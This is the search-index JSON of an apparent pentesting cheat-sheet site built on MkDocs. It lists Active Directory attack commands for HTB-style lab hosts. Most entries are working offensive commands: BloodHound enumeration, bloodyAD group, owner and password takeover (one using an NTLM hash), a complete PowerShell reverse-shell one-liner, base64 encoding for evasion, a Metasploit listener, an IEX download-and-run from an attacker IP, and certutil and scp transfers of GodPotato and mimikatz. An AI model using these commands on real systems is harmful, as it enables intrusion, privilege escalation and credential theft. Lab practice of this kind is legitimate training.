{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"#testing","title":"testing","text":"<p>huh? </p>"},{"location":"active-directory/bloodhound/","title":"Bloodhound","text":""},{"location":"active-directory/bloodhound/#netexec","title":"netexec","text":"<pre><code>nxc ldap 10.10.11.10 -u 'john' -p 'password!' --bloodhound --collection ALL --dns-server 10.10.11.10\n</code></pre>"},{"location":"active-directory/bloodhound/#rousthound","title":"rousthound","text":"<pre><code>rusthound -d local.htb -u 'john' -p 'password!' -f \"DC01.local.htb\" -z\n</code></pre>"},{"location":"active-directory/bloodhound/#bloodhound-python","title":"bloodhound-python","text":"<pre><code>bloodhound-python -u 'john' -p 'password!' -d local.htb --collectionmethod All --zip\n</code></pre>"},{"location":"active-directory/bloodyAd/","title":"bloodyAd","text":""},{"location":"active-directory/bloodyAd/#retrieving-user-information","title":"Retrieving User Information","text":"<pre><code>bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username\n</code></pre>"},{"location":"active-directory/bloodyAd/#adding-user-to-group","title":"Adding user to group","text":"<pre><code>bloodyAD --host \"10.10.11.70\" -d \"local.htb\" -u \"john\" -p 'password!' add groupMember \"DEVELOPERS\" \"john\"\n</code></pre>"},{"location":"active-directory/bloodyAd/#setting-owner","title":"Setting owner","text":"<pre><code>bloodyAD --host \"10.10.11.10\" -d \"local.htb\" -u \"IT-Backup$\" -p \":4de830d1d58c14e241aff55f82ecdba1\" set owner SUPPORT_SERVICES IT-Backup$\n</code></pre>"},{"location":"active-directory/bloodyAd/#changing-password","title":"Changing password","text":"<pre><code>bloodyAD --host '10.10.11.10' -d \"local.htb\" -u \"john\" -p 'password!' set password 'emily' 'P@ssw0rd!'\n</code></pre>"},{"location":"active-directory/getting-a-shell/","title":"Getting a shell","text":""},{"location":"active-directory/getting-a-shell/#reverse-shell","title":"Reverse Shell","text":"<pre><code>$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre>"},{"location":"active-directory/getting-a-shell/#paylod-to-utf-16","title":"Paylod to UTF-16","text":"<pre><code>cat revshell.ps1 | iconv -f UTF-8 -t UTF-16LE | base64 -w 0\n</code></pre>"},{"location":"active-directory/getting-a-shell/#set-up-listener","title":"Set up listener","text":"<pre><code>msfconsole\nuse multi/handler\nset payload windows/powershell_reverse_tcp\nset LHOST 10.10.14.78\nset LPORT 4444\nexploit\n</code></pre>"},{"location":"active-directory/getting-a-shell/#rev-shell","title":"Rev Shell","text":"<pre><code>powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8000/revshell.ps1'')\"\n</code></pre>"},{"location":"active-directory/getting-a-shell/#rev-shell-via-evasion","title":"Rev Shell via Evasion","text":"<pre><code>powershell.exe -nop -exec bypass -e JABjAGwAaQB...\n</code></pre>"},{"location":"active-directory/transfering-file/","title":"Transfering file","text":""},{"location":"active-directory/transfering-file/#certutil","title":"Certutil","text":"<pre><code>certutil -urlcache -split -f http://10.10.16.57:8000/GodPotato-NET4.exe GodPotato-Net4.exe\n</code></pre>"},{"location":"active-directory/transfering-file/#python","title":"Python","text":"<pre><code>python3 -m http.server 8000\n</code></pre>"},{"location":"active-directory/transfering-file/#scp","title":"SCP","text":"<pre><code>scp mimikatz.exe usernamejohn@10.10.10.10:/tmp/mimi.exe\n</code></pre>"}]}